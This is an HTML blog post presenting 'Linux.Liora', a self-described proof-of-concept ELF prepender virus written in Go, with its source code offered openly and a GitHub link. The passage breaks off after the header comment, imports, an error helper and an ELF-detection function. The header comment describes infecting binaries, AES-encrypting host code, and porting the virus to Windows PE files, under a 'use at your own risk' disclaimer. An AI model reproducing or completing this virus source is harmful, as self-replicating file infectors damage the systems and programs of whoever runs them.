<!DOCTYPE html>
<html lang="en-US">
  <head>
    



    <meta name="generator" content="Hugo 0.54.0">
    <meta charset="utf-8">
    <script src="https://use.fontawesome.com/0ae8a400c3.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linux.Liora: a Go virus | TMZ Lair - Underground Coding</title>
    <meta name="description" content="Simple prepender virus written in GoLang">
    <meta name="keywords" content="go, golang, virus, elf, linux, malware">
    
    
    
    
    <meta property="og:title" content="Linux.Liora: a Go virus" />
<meta property="og:description" content="Simple prepender virus written in GoLang" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.guitmz.com/linux-liora/" />
<meta property="article:published_time" content="2015-05-15T16:54:23&#43;02:00"/>
<meta property="article:modified_time" content="2015-05-15T16:54:23&#43;02:00"/>

    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://img06.deviantart.net/94d5/i/2011/074/7/4/crunchbang_simple_by_mlsandahl-d3bptxx.png"/>

<meta name="twitter:title" content="Linux.Liora: a Go virus"/>
<meta name="twitter:description" content="Simple prepender virus written in GoLang"/>

    



  <meta property="og:image" content="http://img06.deviantart.net/94d5/i/2011/074/7/4/crunchbang_simple_by_mlsandahl-d3bptxx.png">


    

    
    
  <meta name="referrer" content="same-origin">


    
    
    <script integrity="sha512-2t0yyNrUdtn9WGIoBVxq5vtoJQYfoDQDbqRPpOb75f1hiL39DGLdJKDrGP60fBhXfrFeKyVhzWJvHvLgln/ElA==">/*! Fetch Inject v2.0.4 | Copyright (C) Josh Habdas <jhabdas@protonmail.com> (https://habd.as) | @license Zlib */
var fetchInject=function(){"use strict";const e=function(e,t,r,n,o,c,i){c=t.createElement(r),i=t.getElementsByTagName(r)[0],c.appendChild(t.createTextNode(n.text)),c.onload=o(n),i?i.parentNode.insertBefore(c,i):t.head.appendChild(c)};return function(t,r){if(!arguments.length)return Promise.reject(new ReferenceError("Failed to execute 'fetchInject': 1 argument required but only 0 present."));if(arguments[0]&&arguments[0].constructor!==Array)return Promise.reject(new TypeError("Failed to execute 'fetchInject': argument 1 must be of type 'Array'."));if(arguments[1]&&arguments[1].constructor!==Promise)return Promise.reject(new TypeError("Failed to execute 'fetchInject': argument 2 must be of type 'Promise'."));const n=[],o=r?[].concat(r):[],c=[];return t.forEach(e=>o.push(window.fetch(e).then(e=>[e.clone().text(),e.blob()]).then(e=>Promise.all(e).then(e=>{n.push({text:e[0],blob:e[1]})})))),Promise.all(o).then(()=>(n.forEach(t=>{c.push({then:r=>{t.blob.type.includes("text/css")?e(window,document,"style",t,r):e(window,document,"script",t,r)}})}),Promise.all(c)))}}();
</script>
    <script integrity="sha512-hno7WeTIciCJSjg/myjyK30HYkrcGCVwo4g4SpUalvrs3r2lS7bPNIQwbCNypKbg7BZ1sA4AsGnk6Gq4NOKpGA==">fetchInject(["/js/lazysizes.min.js"]);
</script>
    



    
    <link rel="canonical" href="https://www.guitmz.com/linux-liora/">
    
    
    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='lime'/%3E%3C/svg%3E">

    

  
  
  
  
  
  
  
    
      
        <style>html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#43a047;text-decoration:none;border-bottom:1px solid #43a047}a:hover{background-color:#43a047;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack ol li:nth-child(n+10):after{left:-7px}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:""}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:"";border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:"";width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:"&nbsp;";height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}
.dark-grey{background-color:#181818;color:#ccc}.dark-grey pre{background-color:#181818;padding:0;border:none}.dark-grey pre code{color:#00bcd4}.dark-grey h1 a,.dark-grey h2 a,.dark-grey h3 a,.dark-grey h4 a,.dark-grey h5 a{color:#ccc}.dark-grey code,.dark-grey strong{color:#fff}.dark-grey code{font-weight:100}.dark-grey table{color:#ccc}.dark-grey table td,.dark-grey table th{border-color:#444}.dark-grey table tbody td:first-child{color:#fff}.dark-grey .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark-grey .form-group.form-textarea label:after{background-color:#181818}.dark-grey .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark-grey .form-control:focus{border-color:#ccc;color:#ccc}.dark-grey textarea.form-control{color:#ccc}.dark-grey .card{border-color:rgba(95,95,95,.78)}.dark-grey .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark-grey .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark-grey .btn.btn-ghost.btn-default:focus,.dark-grey .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark-grey .btn.btn-ghost.btn-default:focus,.dark-grey .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark-grey .btn.btn-ghost.btn-primary:focus,.dark-grey .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark-grey .btn.btn-ghost.btn-success:focus,.dark-grey .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark-grey .btn.btn-ghost.btn-info:focus,.dark-grey .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark-grey .btn.btn-ghost.btn-error:focus,.dark-grey .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark-grey .btn.btn-ghost.btn-warning:focus,.dark-grey .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark-grey .avatarholder,.dark-grey .placeholder{background-color:transparent;border-color:#333}.dark-grey .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark-grey .menu .menu-item.active,.dark-grey .menu .menu-item:hover{color:#fff;border-color:#ccc}:root{scroll-behavior:smooth;--screen-size-small: 30em}@keyframes intro{0%{opacity:0}100%{opacity:1}}.blur-up{-webkit-filter:blur(5px);filter:blur(5px);transition:filter 400ms,-webkit-filter 400ms}.blur-up.lazyloaded{-webkit-filter:blur(0);filter:blur(0)}.hack .readmore{margin-bottom:2.2em}.responsive-iframe{position:relative;padding-bottom:56.25%;padding-top:25px;height:0}.responsive-iframe iframe{position:absolute;top:0;left:0;width:100%;height:100%}iframe{border:0}main,footer{animation:intro .3s both;animation-delay:.15s}header:first-of-type+details{margin-top:1rem}footer time[datetime$=M]:before{content:"\2013\0020"}body>footer p.muted{margin-bottom:0}@media only screen and (max-width:768px){footer time[datetime$=M]{display:none}}blockquote cite{display:block}blockquote cite::before{content:"\2014\00A0"}:target{filter:brightness(1.2)}:disabled{cursor:not-allowed}#search-app [v-cloak]{display:none}.hack li ul{margin:0}.hack ol li{padding-left:27px}.main{padding:20px 10px}input.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}input.form-control,textarea.form-control,select.form-control,.help-block{font-size:initial}@media only screen and (max-width:768px){.help-block{font-size:unset}}html{font-size:13px}.hack .form input,.hack .form textarea,.hack .form button,.hack .form label{font-size:1rem}.hack .alert .highlight:first-of-type .chroma,.hack .card .highlight:first-of-type .chroma{margin-top:unset}.hack .alert .highlight:last-of-type .chroma,.hack .card .highlight:last-of-type .chroma{margin-bottom:unset}.hack blockquote,.hack blockquote:after{line-height:1.5}.hack figure{margin:unset}.hack figure a{border-bottom:none}.hack figure a:hover{background-color:inherit}article [itemprop=description]{margin-bottom:20px;margin-top:20px}article header img{width:100%;border-radius:3px}table td,table th{line-height:inherit}table a{border-bottom:unset}img{max-width:100%}@media only screen and (min-width:768px){html{font-size:16px;margin-left:calc(100vw - 100%)}.container{max-width:50rem}}a[rel*="external"]::after {
  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
}
nav a.active {
  background-color: #43a047;
  color: #fff;
}
a[itemprop="url"] {
  color: #ff9800;
}
a[itemprop="url"]:hover {
  color: #fff;
}
.muted, .help-block {
  opacity: 0.70;
}
.hack .muted,
.hack .help-block {
  color: #e0e0e0;
}

ul.social-icons {
  float: right;
  margin: 0;
  padding: 0;
  margin-block-start: 1em;
  margin-block-end: 1em;
  margin-inline-start: 0px;
  margin-inline-end: 0px;
  padding-inline-start: 40px;
  text-align: center;
  padding-top: 15px;
}

li.social-icons {
  display: inline-block;
  margin: 0 5px;
  list-style-type: circle;
}

a.social-icons {
  border-bottom: 0px;
  background-color: transparent;
  color: #ccc;
}

.highlight,pre.highlight{background:#282c34;color:#abb2bf}.highlight pre{background:#282c34;padding:1em;border:1px solid #ddd;background-color:#181818;box-shadow:5px 5px 5px #306734;}.highlight .ge{font-style:italic}.highlight .gs{font-weight:700}.highlight .ow{font-weight:700}.highlight .n,.highlight .nf,.highlight .nn,.highlight .o,.highlight .p{color:#abb2bf}.highlight .c,.highlight .c1,.highlight .cm,.highlight .cp,.highlight .cs{color:#5c6370;font-style:italic}.highlight .sr,.highlight .ss{color:#56b6c2}.highlight .k,.highlight .kc,.highlight .kd,.highlight .kn,.highlight .kp,.highlight .kr,.highlight .kt{color:#c678dd}.highlight .l,.highlight .ld,.highlight .s,.highlight .s1,.highlight .s2,.highlight .sb,.highlight .sc,.highlight .sd,.highlight .se,.highlight .sh,.highlight .si,.highlight .sx{color:#98c379}.highlight .nt,.highlight .nx,.highlight .vi{color:#e06c75}.highlight .il,.highlight .m,.highlight .mf,.highlight .mh,.highlight .mi,.highlight .mo,.highlight .na{color:#d19a66}.highlight .bp,.highlight .nb,.highlight .nc,.highlight .nd,.highlight .ne,.highlight .ni,.highlight .nl,.highlight .no,.highlight .nv,.highlight .py,.highlight .vc,.highlight .vg{color:#e5c07b}.highlight .err{color:#fff;background-color:#e05252}.highlight .gd{color:#e05252}.highlight .gi{color:#43d08a}.highlight .w{color:#f8f8f2}.highlight .cpf{color:#4146ff}.highlight .gu{color:#75715e}.highlight .lineno{color:#636d83;user-select:none}.highlight .hll{color:#abb2bf;background-color:#2c313a}.highlight .language-json .w+.s2{color:#e06c75}.highlight .language-json .kc{color:#56b6c2}
</style>
        


  
    <meta name="theme-color" content=#181818>
  



      
    
  


    
    
      <script integrity="sha512-ISTAV0GadOIz/NXXHOS+eCM0ysXVVHhQTlvA6LJxz/DeA5yIxm0Vqf5IE+WH0yuuXkayAKtoZkQ326nch5f/fg==">fetchInject(["/css/syntax.css"]);</script>
      <noscript>
        <link href="/css/syntax.css" rel="stylesheet">
      </noscript>
    
  <script defer src="https://cloud.umami.is/script.js" data-website-id="feb30b03-aca1-4123-bc8f-e832ee3e425b"></script></head>
  
  
  
  <body class="dark dark-grey main container">
    <ul class="social-icons">
	<li class="social-icons"><a href="http://twitter.com/share?url=https%3a%2f%2fwww.guitmz.com%2flinux-liora%2f&text=Linux.Liora%3a%20a%20Go%20virus%20" target="_blank" class="social-icons"><i class="fa fa-twitter fa-lg"></i></a></li>
	<li class="social-icons"><a href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.guitmz.com%2flinux-liora%2f" class="social-icons" target="_blank"><i class="fa fa-facebook fa-lg"></i></a></li>
	<li class="social-icons"><a href="http://reddit.com/submit?url=https%3a%2f%2fwww.guitmz.com%2flinux-liora%2f&amp;title=Linux.Liora%3a%20a%20Go%20virus" class="social-icons" target="_blank"><i class="fa fa-reddit-alien fa-lg"></i></a></li>
	<li class="social-icons"><a href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fwww.guitmz.com%2flinux-liora%2f&amp;t=Linux.Liora%3a%20a%20Go%20virus" class="social-icons" target="_blank"><i class="fa fa-hacker-news fa-lg"></i></a></li>
	<li class="social-icons"><a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwww.guitmz.com%2flinux-liora%2f&amp;title=Linux.Liora%3a%20a%20Go%20virus" class="social-icons" target="_blank"><i class="fa fa-linkedin fa-lg"></i></a></li>
	<li class="social-icons"><a href="mailto:?Subject=Linux.Liora%3a%20a%20Go%20virus&amp;Body=https%3a%2f%2fwww.guitmz.com%2flinux-liora%2f" class="social-icons" target="_blank"><i class="fa fa-envelope-o fa-lg"></i></a></li>
</ul>

    <header>
  

  
    
      
  <nav itemscope itemtype="https://schema.org/SiteNavigationElement">
    <meta itemprop="name" content="Main Menu">
    
      
      
        <a itemprop="url" href="/">Home</a>
      
    
      
      
        <a itemprop="url" class="active" href="/post/">Posts</a>
      
    
      
      
        <a itemprop="url" href="/about/">About</a>
      
    
      
      
        <a itemprop="url" href="/search/">Search</a>
      
    
  </nav>


    
  


</header>
    <main>
  <article itemscope itemtype="https://schema.org/BlogPosting">
    
<meta itemprop="name" content="Linux.Liora: a Go virus">
<meta itemprop="description" content="Simple prepender virus written in GoLang">


<meta itemprop="datePublished" content="2015-05-15T16:54:23&#43;02:00" />
<meta itemprop="dateModified" content="2015-05-15T16:54:23&#43;02:00" />
<meta itemprop="wordCount" content="859">



<meta itemprop="keywords" content="go,golang,virus,elf,linux,malware," />

    <header>
      <h1 itemprop="headline name">Linux.Liora: a Go virus</h1>
      <p class="muted">
        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
  <circle cx="16" cy="16" r="14" />
  <path d="M16 8 L16 16 20 20" />
</svg>
<span>5 minute read</span>
<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
</svg>

  Published: <time datetime="2015-05-15T16:54:23&#43;02:00">15 May, 2015</time>


      </p>
      
        <blockquote itemprop="description">Simple prepender virus written in GoLang</blockquote>
      
      
    </header>
    

    <div itemprop="articleBody">
      
      <p>So this guy asks me in a job interview last week &ldquo;Have you ever developed in Go?&rdquo; and well what&rsquo;s best to learn a language than writting a prepender (probably a lot of things but don&rsquo;t kill my thrill)?</p>

<p>There you have it, the <em>probably</em> first ever binary infector written in GoLang (SPTH LIP hxxp://spth.virii.lu/LIP.html &ldquo;outdately&rdquo; confirms that - replace hxxp with http, this website is wrongly classified as malicious for some security tools).</p>

<p>Basically a port from my <a title="Linux.Zariche" href="http://vx.thomazi.me/posts/vala-virus">Linux.Zariche</a> &lsquo;cause my life is in a hurry. I need some time in now to improve those beauties.</p>

<p>Here&rsquo;s the virus source code (also available in my <a href="https://github.com/guitmz/go-liora">GitHub</a> with further files and instructions):</p>

<div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go"><span class="cm">/*
</span><span class="cm">* Linux.Liora - This is a POC ELF prepender written in Go by TMZ (2015).
</span><span class="cm">* It is probably the first binary infector ever written in this language, that&#39;s cool.
</span><span class="cm">* The above affirmation is based on SPTH LIP page: http://spth.virii.lu/LIP.html
</span><span class="cm">*
</span><span class="cm">* Linux.Liora (May 2015) - Simple binary infector in GoLang (prepender).
</span><span class="cm">* This version encrypts the host code with AES and decrypts it at runtime.
</span><span class="cm">* It&#39;s almost a direct port from my Vala infector Linux.Zariche.B.
</span><span class="cm">*
</span><span class="cm">* Compile with: go build -i liora.go (where go &gt;= 1.4.2)
</span><span class="cm">* It has no external dependencies so it should compile under most systems (x86 and x86_64).
</span><span class="cm">* It&#39;s also possible to easly adapt it to be a PE infector and compile under Windows.
</span><span class="cm">*
</span><span class="cm">* Use at your own risk, I&#39;m not responsible for any damages that this may cause.
</span><span class="cm">*
</span><span class="cm">* A shout for those who keeps the scene alive: herm1t, alcopaul, hh86, SPTH, genetix, R3s1stanc3 &amp; others
</span><span class="cm">*
</span><span class="cm">* Feel free to email me: tmz@null.net || You can also find me at http://vxheaven.org/ and on Twitter @TMZvx
</span><span class="cm">* 
</span><span class="cm">* http://vx.thomazi.me
</span><span class="cm">*/</span>

<span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
    <span class="s">&#34;bufio&#34;</span>
    <span class="s">&#34;io/ioutil&#34;</span>
    <span class="s">&#34;os&#34;</span>
    <span class="s">&#34;os/exec&#34;</span>
    <span class="s">&#34;strings&#34;</span>
    <span class="s">&#34;crypto/aes&#34;</span>
    <span class="s">&#34;crypto/cipher&#34;</span>
    <span class="s">&#34;math/rand&#34;</span>
    <span class="s">&#34;time&#34;</span>   

<span class="p">)</span>

<span class="kd">func</span> <span class="nf">check</span><span class="p">(</span><span class="nx">e</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Reading files requires checking most calls for errors.
</span><span class="c1"></span>    <span class="c1">// This helper will streamline our error checks below.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">e</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nb">panic</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">CheckELF</span><span class="p">(</span><span class="nx">file</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
    
    <span class="nx">f</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span>
    <span class="nf">check</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
    <span class="nx">bytes</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="c1">//read the magic number
</span><span class="c1"></span>    <span class="nx">f</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span>
    <span class="nx">f</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
    
    <span class="c1">//check if is an ELF
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">bytes</span><span class="p">),</span> <span class="s">&#34;ELF&#34;</span><span class="p">){</span>
        <span class="k">return</span> <span class="kc">true</span> 
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span>
    <span class="p">}</span>

<span class="p">}</span>

